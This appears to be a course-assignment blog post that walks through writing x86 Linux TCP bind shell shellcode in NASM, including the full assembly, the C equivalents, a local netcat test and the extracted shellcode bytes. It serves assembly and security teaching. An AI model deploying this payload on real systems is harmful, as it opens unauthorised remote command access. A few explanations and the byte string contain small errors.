**Assignment 1**

  Shellcode for TCP Bind Shell with a custom wrapper script for dynamic port of choosing.

**Introduction**

	 Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server.

	 The bind shell could be one with a GUI eg C99php web shell or a non gui shell eg meterpreter bind shell , netcat bind shell etc

	 This is a good start if youre new at this
	 https://resources.infosecinstitute.com/icmp-reverse-shell/#gref


**Methodology**
 
    Its noted that it would be easier to analyse a tcp_bind shell implemented using a high level program like c to see whats going on under the hood and replicate the functions/ sys calls using nasm.

	Overall summary of whats happening under the hood 
	>Creates a socket
	>Binds the socket to an IP address and port
	>Listens for incoming connections
	>Accept an incoming connection
	>Redirects STDIN, STDOUT and STDERR to the socket once a connection is made
	>Executes a shell


	NASM intro
	If youre a beginner this is a good read, https://cs.lmu.edu/~ray/notes/nasmtutorial/
	Functionalities are achieved through syscall , each function calls has a particalur call number , which is placed in EAX , arguments to the function call are passed through EBX,ECX,EDX respectively



	>Create a socket 
			A new socket is created sockdescritptor here is "sock" for internet protocol,tcp and ipv4


			int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			#int socket(int domain, int type, int protocol);
					
			Refer: http://man7.org/linux/man-pages/man2/socket.2.html

			domain    : AF_INET      ,  IPv4 Internet protocols
			type      : SOCK_STREAM  ,  Provides sequenced, reliable, two-way, connection-based byte streams , via TCP 
			prototype : IPPROTO_TCP  ,  internet protocol, pseudo protocol number , we could mention 0 as well 
										 ,  Refer /etc/protocols

		Nasm
					
			push eax  
        		push 0x6  #IPPROTO_TCP
        		push 0x1  #SOCK_STREAM
        		push 0x2  #AF_INET
        		mov ecx,esp
        		mov al,0x66  #socketcall syscall
        		mov bl,0x1   #sys_socket
        		int 0x80   ----> actual sys call.

        		Registers are cleared before they are being used here.
        		
        		EAX contains syscall number 0x66 ie 102
        		toor@ubuntu:~/Desktop/slae/Assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 102
			#define __NR_socketcall         102

			#int socketcall(int call, unsigned long *args);

			From http://man7.org/linux/man-pages/man2/socketcall.2.html, we have 
				    call              Man page
       				SYS_SOCKET        socket(2)
       				SYS_BIND          bind(2)
       				SYS_CONNECT       connect(2)
       				SYS_LISTEN        listen(2)
       				SYS_ACCEPT        accept(2)
       			
       			Since creation is what we are looking for EBX has the value 1

       			*args ie (socket())  ie int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  values are pushed in the stack on reverse order

       			Refer : http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
       					  : http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15440-f11/go/src/pkg/syscall/zerrors_darwin_386.go

       			IPPROTO_TCP                 = 0x6
       			#define SOCK_STREAM	1		/* stream (connection) socket	*/
       			#define AF_INET		2	/* Internet IP Protocol 	*/

       			ECX contains the address location to these arguments 




	>Binds the socket to an IP address and port
				
        		After a socket is created "sock" socket descriptor is binded to all interfaces and a particular port ,here 4444

			bind(sock, (struct sockaddr *) &addr, sizeof(addr));

			struct sockaddr_in addr;
			addr.sin_family = AF_INET;
			addr.sin_port = htons(4444); // Port
			addr.sin_addr.s_addr = htonl(INADDR_ANY);


			Refer: http://man7.org/linux/man-pages/man2/bind.2.html
			#int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

			sockfd : socket discriptor / pointer created from socket function call
			struct : pointer to the structure(user defined data type) containing following arguments
						
			addr.sin_family = AF_INET; 		,  IPv4 Internet protocols
			addr.sin_port = htons(4444);		, Port number to bind(here 4444) ; htons function is to convert  host-to-network short .Refer : https://stackoverflow.com/questions/19207745/htons-function-in-socket-programing
						
			addr.sin_addr.s_addr = htonl(INADDR_ANY); ,INADDR_ANY binds the socket to all available interfaces eg eth0,lo etc. htonl is to convert the unsigned integer hostlong from host byte order to network byte order

		NASM

			mov edi,eax

       			;socket struct defining variables
        		push edx
        		push edx         #ip address ie 0
        		push word 0x5c11 #port number
        		push word 0x2    #af_inet value
        		mov esi,esp

        		;socket bind call

        		push 0x10    #addrlen
        		push esi     #structure address
        		push edi     #sockfd
        		mov ecx,esp  #bind arguments address
        		mov al,0x66  # socketsyscall 
        		mov bl,0x2   # bind function in socketcall
        		int 0x80


        		After the socket creation sys call eax contain the socket file descriptor , it is being copied to edi

        		EAX 0x66 , 102 socketcall
        		EBX 0x2  , SYS_BIND functioncall

			ie		int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

			Parameters are pushed on to the stack in reverse order
					
			length of ip address is pushed pushed first ie 0x10 (addrlen)
			structure parameters (esi has the address)
				: ip address ie 0 
				: port number 0x5c11 hex(octal(4444)) = 0x115c , htons = 0x5c11
				: AF_INet ie 0x2

			file descriptor ie (edi) pushed on to the stack										  		
                   	ECX has the address location to parameters for bind call 

			

	>Listens for incoming connections

			Once a socket is created and binded to a particular port ,it awaits for an incomming connections ie listen mode

			listen(sock,0);
			#int listen(int sockfd, int backlog);

			sock : Socket descriptor from socket creation
			backlog : value is set to zero ,since only one connection is required
			The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.
			ie no of connections should be in the queue , if there is already a connection established.


		NASM

			xor esi,esi
        		push esi    #null (backlog)
        		push edi    #sockfd
          		mov ecx,esp
          		mov al,0x66 #102 socketcall
          		mov bl,0x4  #SYS_LISTEN  functioncall
          		int 0x80

          		EAX 0x66 , 102 socketcall
        		EBX 0x4  , SYS_LISTEN  functioncall

        		#int listen(int sockfd, int backlog);
        		ECX contains the address location to sockfd and null(backlog)	
        		 		


	>Accepting the connection
		
    	    		Syscall to accept the incomming connection.On success, these system calls return a nonnegative integer that is a
       	  		file descriptor for the accepted socket

			int fd = accept(sock, NULL, NULL);
			int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

			sock : socket descriptor that has been created with socket function
			sockaddr and socklen_t : set to null ,since we dont need to store the details of the peer connection host
			The argument addr is a pointer to a sockaddr structure.  This
       				structure is filled in with the address of the peer socket, as known
       				to the communications layer.  The exact format of the address
       				returned addr is determined by the socket's address family (see
       				socket(2) and the respective protocol man pages).  When addr is NULL,
       				nothing is filled in; in this case, addrlen is not used, and should
       				also be NULL.
		NASM

       	    		xor esi,esi
            		push esi     ;addrelen 0   since peer info is not needed
        		push esi     ;sockaddr *addr 0
        		push edi     ;sock fd
        		mov ecx,esp
        		mov al,0x66  ;socketcall 
        		mov bl,0x5   ;sys_accept function
        		int 0x80

        		EAX 0x66 , 102 socketcall
        		EBX 0x5  , SYS_ACCEPT  functioncall
        					int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

        		ECX contains address location to sockfiledescriptor ,0 ,0			


    	>Redirect STDIN, STDOUT and STDERR to the socket once a connection is made
       			
       		 	Redirect/Duplicate stdin,stdout,stderr to the socket process	

       		 	This system call create a copy of the file descriptor oldfd.dup2 makes newfd be the copy of oldfd. 0 represents stdin ,1 stdout and 2 stderror respectively. This is done basically to transfer input,output and error to the socket connection(socket descriptor)

       		 	dup2(fd, 0); // stdin
    			dup2(fd, 1); // stdout
    			dup2(fd, 2); // stderr

    			#int dup2(int oldfd, int newfd);

		NASM

    		  	mov ebx,eax   # file descrptor for accepted socket
        		xor ecx,ecx   #0,stdin

          		mov al,0x3f   #63 dup2 sys call
          		int 0x80

          		inc ecx       #1,stdout
          		mov al,0x3f
          		int 0x80

          		inc ecx       #2,stderr
          		mov al,0x3f
          		int 0x80

          		EAX = 0x3f , ie 63 dup2
          		toor@ubuntu:~/Desktop/slae/Assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 63
				  #define __NR_dup2                63
				  @int dup2(int oldfd, int newfd);

			EBX , new sockfd .On accept() call success, this system call return a nonnegative integer that is a file descriptor for the accepted socket

			ECX = 0,1 and 2 to represent stdin ,stdout and stderr

	>Executes a shell	

    		  	This executes the program referred to by pathname. Here /bin/sh is executed.It could be /bin/sh or /bin/bash or /bin/rsh etc
    			
    			execve("/bin/sh", NULL, NULL);
    			#int execve(const char *pathname, char *const argv[],char *const envp[]);

    			pathname is set to /bin/sh
    			since we are not passing any arguments and not need of any environemntal value ,they are set to null


    		NASM

    		  	xor eax,eax
        		push eax
        		push 0x68736162         ////bin/bash in reverse
        		push 0x2f6e6962
        		push 0x2f2f2f2f
        		mov ebx,esp

        		push eax    # environament value ie ,0
        		push ebx    #pointer to /bin/bash address loc
        		mov ecx,esp

        		mov al,11
        		xor edx,edx #arguments for execve , ie 0
        		int 0x80

        		EAX = 11 , syscall execve
        		toor@ubuntu:~/Desktop/slae/Assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 11
			#define __NR_execve              11

		      	EBX address location to /bin/bash
		      	ECX and EDX are set to zero as there is no arguments / environmental variables




**Practical**

A simple compile script is used to compile and link .asm file , once successfull ,we can execute it and connect to it

	toor@ubuntu:~/Desktop/slae/Assignments/1$ cat compile.sh
	#!/bin/bash
	echo 'Assembling with nasm'
	nasm -f elf32 -o $1.o $1.asm
	echo 'Success, Now Linking'
	ld -o $1 $1.o
	echo 'Go Ahead, may the force be with you'
	toor@ubuntu:~/Desktop/slae/Assignments/1$ 

	toor@ubuntu:~/Desktop/slae/Assignments/1$ ./compile.sh bind
	Assembling with nasm
	Success, Now Linking	
	Go Ahead, may the force be with you	
	toor@ubuntu:~/Desktop/slae/Assignments/1$ ./bind


	toor@ubuntu:~/Desktop/slae/Assignments/1$ nc -v 127.0.0.1 4444
	Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
	id
	uid=1000(toor) gid=1000(toor) groups=1000(toor),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
	echo $SHELL
	/bin/bash
                                   



**SHELLCODE**
  
  Using objdump to extract shellcode

  	toor@ubuntu:~/Desktop/slae/Assignments/1$ objdump -d ./bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
	"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x50\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc7\x52\x52\x66\x68\x1  1\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x57\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xf6\x56\x57\x89\xe1\xb0\x66\xb3\x04\xcd\x80\x31\xf6\x56\x56\x57\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
	toor@ubuntu:~/Desktop/slae/Assignments/1$


**Wrapper script to bind custom port**

  	Since the port 4444 is harcoded in the script we have to create a custom shellcode with customisable portnumber.
  	Script logic is user port number input is converted to network byte order and swapped with 4444 representation.
	Refer: portbuilder.py


**Github Repo**

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: 		http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

 Student ID: SLAE-1509
